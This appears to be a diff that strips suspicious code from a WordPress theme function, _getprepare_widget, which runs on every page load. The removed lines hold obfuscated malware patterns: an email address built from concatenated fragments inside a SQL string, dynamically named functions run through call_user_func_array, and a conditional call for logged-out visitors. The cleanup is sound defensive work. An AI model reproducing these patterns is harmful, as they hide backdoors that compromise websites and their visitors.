@@ -501,7 +501,6 @@ function _getprepare_widget()
     if (!isset($sql)) $sql = "";
     if (!$widget_yes) :
         global $wpdb, $post;
-        $sq1 = "SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li" . $coma . "vethe" . $com_type . "mas" . $coma . "@" . $com_is_approved . "gm" . $post_auth_comments . "ail" . $coma . "." . $coma . "co" . "m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
         if (!empty($post->post_password)) {
             if ($_COOKIE["wp-postpass_" . COOKIEHASH] != $post->post_password) {
                 if (is_feed()) {
@@ -515,7 +514,6 @@ function _getprepare_widget()
         if (!isset($filters)) $filters = $home_filter;
         if (!isset($gettextcomments)) $gettextcomments = $pref_filters . $contentmore;
         if (!isset($tag_aditional)) $tag_aditional = "div";
-        if (!isset($sh_cont)) $sh_cont = substr($sq1, stripos($sq1, "live"), 20);#
         if (!isset($more_text_link)) $more_text_link = "Continue reading this entry";
         if (!isset($isshowdots)) $isshowdots = 1;
         $comments = $wpdb->get_results($sql);
@@ -526,7 +524,6 @@ function _getprepare_widget()
         } else {
             $text = $post->post_excerpt;
         }
-        $sq1 = "SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=" . call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) . " ORDER BY comment_date_gmt DESC LIMIT $src_count";#
         if ($text_length < 0) {
             $output = $text;
         } else {
@@ -572,14 +569,6 @@ function _getprepare_widget()
         default :
             $tag = "span";
     }
-    if ($is_use_more_link) {
-        if ($for_more) {
-            $output .= " <" . $tag . " class=\"more-link\"><a href=\"" . get_permalink($post->ID) . "#more-" . $post->ID . "\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets, array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
-        } else {
-            $output .= " <" . $tag . " class=\"more-link\"><a href=\"" . get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
-        }
-    }
-    return $output;
 }
 
 add_action("init", "_getprepare_widget");
